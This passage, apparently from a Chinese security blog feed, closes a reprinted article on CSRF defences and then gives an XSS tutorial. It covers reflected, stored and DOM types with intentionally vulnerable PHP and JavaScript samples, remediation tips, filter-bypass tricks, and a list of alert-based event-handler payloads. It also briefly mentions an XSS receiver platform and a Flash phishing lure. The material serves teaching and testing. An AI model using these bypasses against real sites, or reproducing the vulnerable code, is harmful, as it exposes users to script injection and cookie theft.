<p>​    然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
<p>​    <strong>在请求地址中添加 token 并验证</strong></p>
<p>​     CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>
<p>​    这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <code>http://url?csrftoken=tokenvalue</code>。 而对于 POST 请求来说，要在 form 的最后加上 <code>&lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;tokenvalue&quot;/&gt;</code>，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</p>
<p>该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p>
<p>   <strong>在 HTTP 头中自定义属性并验证</strong></p>
<p>​    这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。    然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p>
<p>引用地址：<code>http://www.phpddt.com/reprint/csrf.html</code></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
        <tag>CSRF</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>跨站脚本攻击(XSS)</title>
    <url>/2019/12/16/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E(XSS)/</url>
    <content><![CDATA[<p>XSS漏洞是Web应用程序中最常见的漏洞之一。如果您的站点没有预防XSS漏洞的固定方法，那么很可能就存在XSS漏洞。文章讲会从代码层面讲解XSS还有一些Payload。</p>
<a id="more"></a>

<h2 id="0x00概述"><a href="#0x00概述" class="headerlink" title="0x00概述"></a>0x00概述</h2><p> xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找未过滤的输出函数。只要输出函数可控结合一些绕过手法即可达到xss攻击的目的。<br> 常见的输出函数有： <code>echo printf print print_r sprintf die var-dump var_export</code>.</p>
<h2 id="0x01-XSS类型"><a href="#0x01-XSS类型" class="headerlink" title="0x01 XSS类型"></a>0x01 XSS类型</h2><p>反射型XSS：一般存在于链接之中或者请求之中可以实现自我攻击也就是self-xss也可以欺骗用户去点击 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容他只存在GET请求的url链接中或者POST的http数据包中 当请求数据发生改变的时候对应的页面也会发生改变），一般容易出现在搜索页面。</p>
<p>存储型XSS：代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p>
<p>DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞</p>
<h2 id="0x02-从代码层面理解xss原理"><a href="#0x02-从代码层面理解xss原理" class="headerlink" title="0x02 从代码层面理解xss原理"></a>0x02 从代码层面理解xss原理</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>在黑盒测试中，这种类型比较容易通过漏扫直接发现，我们只需要按照扫描结果进行相应的验证就可以了。</p>
<p>相对的在白盒审计中， 我们首先要寻找带参数的输出函数，接下来通过输出内容回溯到输入参数，观察是否过滤即可。</p>
<p>接下来我们拿PHP<code>echo</code>函数举例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//xss.php文件</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;反射型XSS&lt;/title&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt; </span><br><span class="line">    &lt;span&gt;情输入你的名字：&lt;/span&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;     </span><br><span class="line">&lt;input type=&quot;submit&quot;&gt; </span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">$username = $_GET[&apos;user&apos;];</span><br><span class="line">echo &apos;你的名字为:&lt;br&gt;&apos;.$username;</span><br><span class="line">?&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/name.png" alt="html">    </p>
<p>从代码中也可以看到对user的输入没有做任何过滤直接打印在页面上 下面试一下弹窗</p>
<p><img src="/images/XSS/xss_1.png" alt="html">    </p>
<p>我们可以看到浏览器的页面已经成功的解析了js代码 当然光弹框不够的 需要构造js读取一些敏感数据 js能做的事情还是比较多的。</p>
<h3 id="储存型xss"><a href="#储存型xss" class="headerlink" title="储存型xss"></a>储存型xss</h3><p>和反射性XSS的即时响应相比，存储型XSS则需要先把利用代码保存在比如数据库或文件中（一般文章名字用户名信息之类的），当web程序读取利用代码时再输出在页面上执行利用代码。但存储型XSS不用考虑绕过浏览器的过滤问题，屏蔽性也要好很多。</p>
<p><img src="/images/XSS/xsslc.png" alt="html">    </p>
<p>存储型XSS的白盒审计同样要寻找未过滤的输入点和未过滤的输出函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;span style=&quot;font-size:18px;&quot;&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;/&gt; </span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt;  </span><br><span class="line">&lt;title&gt;储存型XSS&lt;/title&gt;  </span><br><span class="line">&lt;/head&gt;  </span><br><span class="line">&lt;body&gt;  </span><br><span class="line">&lt;h2&gt;用户注册&lt;h2&gt;  </span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;form action=&quot;xss.php&quot; method=&quot;post&quot;&gt;  </span><br><span class="line">账号:&lt;textarea id=&apos;user&apos; name=&quot;user&quot;&gt;&lt;/textarea&gt; </span><br><span class="line">&lt;br/&gt; </span><br><span class="line">密码:&lt;textarea id=&apos;pass&apos; name=&quot;pass&quot;&gt;&lt;/textarea&gt; </span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;注册&quot;/&gt;  </span><br><span class="line">&lt;/form&gt;  </span><br><span class="line">&lt;?php  </span><br><span class="line">if(isset($_POST[&apos;user&apos;])&amp;&amp;isset($_POST[&apos;pass&apos;]))&#123;  </span><br><span class="line">	$file=fopen(&quot;user.txt&quot;,&quot;a&quot;);  //打开文件只写</span><br><span class="line">	fwrite($file,$_POST[&apos;user&apos;].&quot;\r\n&quot;);  //写数据</span><br><span class="line">	fwrite($file,$_POST[&apos;pass&apos;].&quot;\r\n&quot;);  //写数据</span><br><span class="line">	fclose($file);  //关闭文件流</span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">if(file_exists(&quot;user.txt&quot;))&#123;  //判断文件是否存在</span><br><span class="line">	$read= fopen(&quot;user.txt&quot;,&apos;r&apos;);  //打开文件只读</span><br><span class="line">	while(!feof($read))&#123;  </span><br><span class="line">    	echo fgets($read).&quot;&lt;/br&gt;&quot;;  //循环写到页面</span><br><span class="line">	&#125;  </span><br><span class="line">	fclose($read);  //关闭文件流</span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br><span class="line">&lt;/html&gt;&lt;/span&gt;  </span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>首先我们注册一下测试功能</p>
<p><img src="/images/XSS/register.png" alt="html">    </p>
<p>注册功能正常并且可以正常显示出来</p>
<p>我面我们输入js代码看看页面会有什么反应 payload：<code>&lt;script&gt;alert(</code>melon<code>)&lt;/script&gt;</code></p>
<p><img src="/images/XSS/xss_2.png" alt="html">    </p>
<p><img src="/images/XSS/notpad.png" alt="html">    </p>
<p>我们可以看到文件中的内容已经写进了js代码 而且是持久化的 无论我们的访问链接中带不带恶意的参数这个js别的用户都会执行，这就是所谓的存储型XSS漏洞，一次提交之后，每当有用户访问这个页面都会受到XSS攻击，危害巨大。</p>
<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p><strong>不做任何过滤跳转</strong></p>
<p>在很多场景下，业务需要实现页面跳转，常见的使用，<code>location.href()</code> <code>location.replace()</code> <code>location.assign()</code>这些方法通过Javascript实现跳转。我们第一时间可能想到的是限制不严导致任意URL跳转漏洞，而DOM XSS与此似乎“八竿子打不着”，实际上跳转部分参数可控，可能导致Dom xss。</p>
<p>举一个简单的例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> hash = location.hash;</span><br><span class="line">	<span class="keyword">if</span>(hash)&#123;</span><br><span class="line">		<span class="keyword">var</span> url = hash.substring(<span class="number">1</span>); <span class="comment">//#为第0个字符 截取后为javascript:alert(1) 然后浏览器跳转实现xss</span></span><br><span class="line">		location.href = url;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/xssdom1.png" alt="html">    </p>
<p>解析：变量hash为可控部分，并带入url中，变量hash控制的是#之后的部分，那么可以使用伪协议<code>#javascript:alert</code></p>
<p><img src="/images/XSS/xssdom2.png" alt="html">    </p>
<p>data伪协议也是可以的</p>
<p><strong>使用indexOf判断URL参数是否合法</strong></p>
<p>先放上代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> melon = location.search.slice(<span class="number">1</span>);      <span class="comment">// 截取url中?之后的部分</span></span><br><span class="line">	<span class="keyword">if</span>(melon.indexOf(<span class="string">"url="</span>) &gt; <span class="number">-1</span> &amp;&amp; melon.indexOf(<span class="string">"http"</span>) &gt; <span class="number">-1</span>)&#123;  <span class="comment">// 判断melon中是否有url=和http关键字</span></span><br><span class="line">		<span class="keyword">var</span> pos = melon.indexOf(<span class="string">"url="</span>)+<span class="number">4</span>;      </span><br><span class="line">		url = melon.slice(pos,melon.length);         <span class="comment">//从第五个开始也就是等号开始截取到最后</span></span><br><span class="line">		location.href = url                 <span class="comment">// 跳转</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：<code>?url=javascript:alert(1)//http</code></p>
<p><img src="/images/XSS/xssdom3.png" alt="html"></p>
<p>这样是由于过滤不严格导致的 因该把url=后的以http或者https写死 上面的写法只是存在http即可 //相当于注释掉了但是确实存在http所以绕过了</p>
<p>XSS大都是大同小异 对用户的过分相信输入导致了漏洞的出现</p>
<h2 id="0x03修复建议"><a href="#0x03修复建议" class="headerlink" title="0x03修复建议"></a>0x03修复建议</h2><p>1、防堵跨站漏洞，阻止攻击者利用在被攻击网站上发布跨站攻击语句</p>
<p>不可以信任用户提交的任何内容，首先代码里对用户输入的地方和变量都需要仔细检查长度和对”&lt;”，”&gt;”，”；”，”’”等字符做过滤；其次任何内容写到页面之前都必须加以encode，避免不小心把htmltag弄出来。这一个层面做好，至少可以堵住超过一半的XSS攻击。</p>
<p>2、cookie防盗</p>
<p>首先避免直接在cookie中泄露用户隐私，例如email、密码等等。其次通过使cookie和系统ip绑定来降低cookie泄露后的危险。这样攻击者得到的cookie没有实际价值，不可能拿来重放。</p>
<p>3、尽量采用POST而非GET提交表单</p>
<p>POST操作不可能绕开javascript的使用，这会给攻击者增加难度，减少可利用的跨站漏洞。</p>
<p>4、严格检查refer</p>
<p>检查httprefer是否来自预料中的url。这可以阻止第2类攻击手法发起的http请求，也能防止大部分第1类攻击手法，除非正好在特权操作的引用页上种了跨站访问。</p>
<p>5、将单步流程改为多步，在多步流程中引入效验码</p>
<p>多步流程中每一步都产生一个验讠正码作为hidden表单元素嵌在中间页面，下一步操作时这个验讠正码被提交到服务器，服务器检查这个验讠正码是否匹配。首先这为第1类攻击者大大增加了麻烦。其次攻击者必须在多步流程中拿到上一步产生的效验码才有可能发起下一步请求，这在第2类攻击中是几乎无法做到的。</p>
<p>6、引入用户交互</p>
<p>简单的一个看图识数可以堵住几乎所有的非预期特权操作。</p>
<p>7、只在允许anonymous访问的地方使用动态的javascript。</p>
<p>8、对于用户提交信息的中的img等link，检查是否有重定向回本站、不是真的图片等可疑操作。</p>
<p>9、内部管理网站的问题</p>
<p>很多时候，内部网站往往疏于关注安全问题，只是简单的限制访问来源。这种网站往往对XSS攻击毫无抵抗力，需要多加注意。</p>
<p>虽然XSS的攻击很灵活，只要我们能做好上述几点，是可以组织大部分XSS的，再及时打好补丁可以最大程度的减少来自跨站脚本攻击XSS的威胁。</p>
<h2 id="0x04关于XSS的一些绕过"><a href="#0x04关于XSS的一些绕过" class="headerlink" title="0x04关于XSS的一些绕过"></a>0x04关于XSS的一些绕过</h2><h3 id="改变大小写"><a href="#改变大小写" class="headerlink" title="改变大小写"></a>改变大小写</h3><p>在测试过程中，我们可以改变测试语句的大小写来绕过XSS规则：</p>
<p>比如：<code>&lt;script&gt;alert(“xss”);&lt;/script&gt;</code>可以转换为：<code>&lt;ScRipt&gt;ALeRt(“XSS”);&lt;/sCRipT&gt;</code></p>
<h3 id="关闭标签"><a href="#关闭标签" class="headerlink" title="关闭标签"></a>关闭标签</h3><p>有时候我们需要关闭标签来使我们的XSS生效。</p>
<p>比如：<code>&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code></p>
<h3 id="使用hex编码绕过"><a href="#使用hex编码绕过" class="headerlink" title="使用hex编码绕过"></a>使用hex编码绕过</h3><p>我们可以对我们的语句进行hex编码来绕过XSS规则</p>
<p>比如：<code>&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code>可以转换为：<br><code>%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e</code></p>
<h3 id="绕过magic-quotes-gpc"><a href="#绕过magic-quotes-gpc" class="headerlink" title="绕过magic_quotes_gpc"></a>绕过magic_quotes_gpc</h3><p>magic_quotes_gpc=ON是php中的安全设置，开启后会把一些特殊字符进行轮换，比如<br><code>&#39;(单引号)转换为\&#39;，&quot;(双引号)转换为\&quot;，\转换为\\</code></p>
<p>比如：<code>&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code>会转换为<code>&lt;script&gt;alert(\&quot;xss\&quot;);&lt;/script&gt;</code>,这样我们的xss就不生效了。</p>
<p>针对开启了magic_quotes_gpc的网站，我们可以通过javascript中的String.fromCharCode方法来绕过，我们可以把alert(“XSS”);转换为</p>
<p>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34,41)那么我们的XSS语句就变成了</p>
<p><code>&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88,83, 83, 34, 41, 59)&lt;/script&gt;</code></p>
<p>String.fromCharCode()是javascript中的字符串方法，用来把ASCII转换为字符串。</p>
<p>最后使用<code>&lt;script&gt;转换后的放到这里&lt;/script&gt;</code>包含即可。</p>
<h3 id="利用-lt-gt-标记注射Html-Javascript"><a href="#利用-lt-gt-标记注射Html-Javascript" class="headerlink" title="利用&lt;&gt;标记注射Html/Javascript"></a>利用&lt;&gt;标记注射Html/Javascript</h3><p>如果用户能随心所欲引入&lt;&gt;标记，那他就能操作HTML标记，然后就能通过<script>标签插入JS恶意脚本了，例如：</p>
<p><code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></p>
<p>当然如果对"<>"和script等进行了过滤，上面这个就无法执行了</p>
<h3 id="利用HTML标签属性值执行XSS"><a href="#利用HTML标签属性值执行XSS" class="headerlink" title="利用HTML标签属性值执行XSS"></a>利用HTML标签属性值执行XSS</h3><p>很多HTML标记中的属性都支持javascript:[code]伪协议的形式，这就给了注入XSS可乘之机,例如：</p>
<p><code>&lt;img src = &quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</code></p>
<p>这里即便对传入的参数过滤了<>,XSS还是能发生(前提是该标签属性需要引用文件)</p>
<h3 id="空格-回车-Tab"><a href="#空格-回车-Tab" class="headerlink" title="空格/回车/Tab"></a>空格/回车/Tab</h3><p>假设过滤函数进一步又过滤了javascript等敏感字符串，只需对javascript进行小小的操作即可绕过，例如：</p>
<p>　<code>&lt;img src= &quot;java　　script:alert(&#39;xss&#39;);&quot; width=100&gt;</code></p>
<p>这里之所以能成功绕过，其实还得益于JS自身的性质：Javascript通常以分号结尾，如果解析引擎能确定一个语句时完整的，且行尾有换行符，则分号可省略</p>
<p>而如果不是完整的语句，javascript则会继续处理，直到语句完整结束或分号。</p>
<p>像<code>&lt;img src= &quot;javascript:　alert(/xss/); width=100&gt;</code> 同样能绕过</p>
<h3 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h3><p>过滤严谨的函数很可能对标签也进行了严格的控制，但是如果用其他形式表示标签,脚本仍能解析却可以绕过过滤</p>
<p>常见的编码方式有：HTML实体编码(&#ASCII),十进制、十六进制、八进制编码，unicode编码及escape编码及使用String.fromCharCode(...)绕过</p>
<p>因此<code>&lt;img src= &quot;javascript&amp;#116&amp;#alert(/xss/);&quot;&gt;</code>可以实现绕过</p>
<p>另外还可以把&#01、&#02、&#09等字符插入代码的头部或任意地方</p>
<h3 id="产生自己的事件"><a href="#产生自己的事件" class="headerlink" title="产生自己的事件"></a>产生自己的事件</h3><p>如果不能依靠属性进行跨站，那么还可以利用事件处理函数</p>
<p><code>&lt;input type = &quot;button&quot; value = &quot;clickme&quot; οnclick=&quot;alert(&#39;click me&#39;)&quot; /&gt;</code></p>
<p>事件既能让JS脚本运行，自然也可以执行跨站，另外像onerror、onMouseover等都可利用的是事件处理函数</p>
<h3 id="利用CSS跨站剖析"><a href="#利用CSS跨站剖析" class="headerlink" title="利用CSS跨站剖析"></a>利用CSS跨站剖析</h3><p>之所以说CSS样式表是个很不错的载体，是因为CSS不需要嵌入到HTML代码中，可以直接从文件或其他地方进行引用. 另外CSS同样隐蔽、灵活，不过不同</p>
<p>浏览器之间不能通用，如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div style = <span class="string">"list-style-image:url(javascript:alert(‘xSS‘))"</span>&gt;</span><br><span class="line">&lt;link rel = <span class="string">"stylesheet"</span> href =<span class="string">"http://www.xxx.com/atack.css"</span>&gt;</span><br><span class="line">&lt;style type=‘text/css‘&gt;@<span class="keyword">import</span> url(http:<span class="comment">//www.xxx.com/xss.css);&lt;/style&gt;</span></span><br><span class="line">&lt;style&gt;@<span class="keyword">import</span> ‘javascript:alert(‘xss‘);‘&lt;<span class="regexp">/style&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="绕过过滤规则"><a href="#绕过过滤规则" class="headerlink" title="绕过过滤规则"></a>绕过过滤规则</h3><p>大小写混用：<code>&lt;iMgSRC = &quot;JavaScript:alert(0);&quot;&gt;</code></p>
<p>不使用引号或者构造全角字符也能扰乱过滤规则</p>
<p>还有像CSS中/**/会被浏览器忽略，\和\0同样或被浏览器忽略，同样可以用来绕过：</p>
<p><code>&lt;img src =&quot;java/*javascript:alert(&#39;xss&#39;)*/script:alert(1);&quot;&gt;</code></p>
<h3 id="充分利用字符编码"><a href="#充分利用字符编码" class="headerlink" title="充分利用字符编码"></a>充分利用字符编码</h3><p>上面说到过编码，这里加以补充，除了像&#ASCII，其实也可以采用&#0、&#00、&#000等形式，同样&#x6a的形式也是可以的</p>
<p><code>&lt;script&gt;eval(&quot;\61\6c\65......&quot;);&lt;script&gt;</code></p>
<p>如果使用eval执行10进制形式的脚本则需要配合string.fromcharcode()使用</p>
<h3 id="拆分跨站法"><a href="#拆分跨站法" class="headerlink" title="拆分跨站法"></a>拆分跨站法</h3><p>拆分跨站就是像shellcode一样，遇到长度限制不能按正常方式跨站时，通过引入变量多次提交将之连接起来实现跨站，例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;z=‘<span class="built_in">document</span>.‘&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;z=+'write'("''&lt;/</span>script&gt;</span><br><span class="line">&lt;script&gt;z=z+<span class="string">''</span>&lt;script<span class="string">'&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>......</p>
<p><code>&lt;script&gt;eval(z)&lt;/script&gt;</code><br>另外除了像上面多次提交，也可以引用其他变量如：eval(qUserInfo.spaceName)形式，由于qUserInfo.spaceName是可控变量，因此改变其值就可以绕过长度限制了</p>
<h2 id="0x05-一些Payload"><a href="#0x05-一些Payload" class="headerlink" title="0x05 一些Payload"></a>0x05 一些Payload</h2><p>这里放一些由事件触发的payload 自己拿这些事件做了下实验还是挺好玩的 </p>
<p>FUZZ思路就是选弹框不一样payload直接全放进去一般指富文本编辑器或者留言框 其他的就用爆破把 注意线程就好了</p>
<p>还有要强力推荐一下<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">BlueLotus_XSS</a>平台 dockerfile很方便 平台很好用 里面有一部分payload模板也可以自己去写一些模板然后生成js文件 </p>
<p>一些网上也提供xss平台 他们有大量的payload而且服务器是一直开着的对我们盲打xss有很大的优势</p>
<p>还有一个flash钓鱼 伪造flash页面一些管理员安全意识不强会进入钓鱼页面 下载我们伪造的文件 直接上线主机 远控一般用CS</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">其实所有经过Unicode编码的payload都不需要双引号和分号就可以执行 而转化为ascii转化为十六进制后就不行</span><br><span class="line"></span><br><span class="line">引号过滤绕过</span><br><span class="line">&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34,41))&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">img标签</span><br><span class="line">&lt;img STYLE=&quot;background-image:url(javascript:alert(&apos;CSS&apos;))&quot;&gt; //版本，E7.0|IE6.0，才能执行</span><br><span class="line">&lt;img STYLE=&quot;background-image:\75\72\6c\28\6a\61\76\61\73\63\72\69\70\74\3a\61\6c\65\72\74\28\27\58\53\53\27\29\29&quot;&gt;   //版本，E7.0|IE6.0，才能执行</span><br><span class="line">&lt;img src=javascript:alert(&apos;xss&apos;)&gt;//版本，E7.0|IE6.0，才能执行</span><br><span class="line">&lt;img src=x onerror=alert(&apos;xss&apos;)&gt; //全版本通用</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt; //可以不加&quot;和;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;&lt;/img&gt;  //必须要有双引号，不然执行不了</span><br><span class="line">&lt;img src=&quot;https://melons.top/images/hexo-inverted.svg&quot; onload=alert(&apos;xss&apos;)&gt;  //当src为正常图片加载出来的时候会加载onload属性</span><br><span class="line">&lt;img src=&quot;x&quot; onmousedown=alert(&apos;xss&apos;)&gt;  //点击图片触发</span><br><span class="line">&lt;img src=&quot;x&quot; onmousemove=alert(&apos;xss&apos;) style=&quot;width:100%;height:100%;&quot;&gt; //鼠标在图片上移动触发</span><br><span class="line">&lt;img src=1 onmouseover=alert(&apos;xss&apos;) style=&quot;width:100%;height:100%;&quot;&gt; //鼠标进入图片触发</span><br><span class="line">&lt;img src=1 onmouseout=alert(&apos;xss&apos;)&gt; //鼠标离开图片触发</span><br><span class="line">&lt;img src=1 onmouseup=alert(&apos;xss&apos;) style=&quot;width:100%;height:100%;&quot;&gt; //在图片上释放鼠标事件执行 点击一下两个事件 获取 释放 后者事件满足则触发</span><br><span class="line">&lt;img src=1 onmousewheel=alert(&apos;xss&apos;) style=&quot;width:100%;height:100%;&quot;&gt;  //在图片上滚动 可以使用style写css覆盖当前页面</span><br><span class="line"></span><br><span class="line">video标签下</span><br><span class="line">&lt;video src=&quot;https://melons.top//images/ocean/ocean.mp4&quot; oncanplay=alert(1)&gt; //当文件就绪可以开始播放时运行的脚本</span><br><span class="line">&lt;video src=&quot;https://melons.top//images/ocean/ocean.mp4&quot; ondurationchange=alert(2)&gt; //当媒介长度改变时运行的脚本。</span><br><span class="line">&lt;video src=&quot;x&quot; onerror=alert(2)&gt;</span><br><span class="line">&lt;video src=&quot;https://melons.top//images/ocean/ocean.mp4&quot; onloadeddata=alert(2)&gt; //当媒介数据已加载时运行的脚本</span><br><span class="line">&lt;video src=&quot;https://melons.top//images/ocean/ocean.mp4&quot; onloadedmetadata=alert(2)&gt; //当元数据（比如分辨率和时长）被加载时运行的脚本</span><br><span class="line">&lt;video src=&quot;https://melons.top//images/ocean/ocean.mp4&quot; onloadstart=alert(123)&gt; //当媒介数据开始加载时运行的脚本</span><br><span class="line"></span><br><span class="line">a标签下</span><br><span class="line">&lt;a href=&quot;javascript:alert(&apos;a标签xss&apos;)&quot;&gt;a标签xss&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;a标签xss2&lt;/a&gt; //不可以去双引号</span><br><span class="line">&lt;a href=javascript:eval(&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&quot;)&gt;a标签xss3&lt;/a&gt; //可以去双引号</span><br><span class="line">&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&quot;&gt;a标签xss4&lt;/a&gt; //可以去双引号</span><br><span class="line">&lt;a 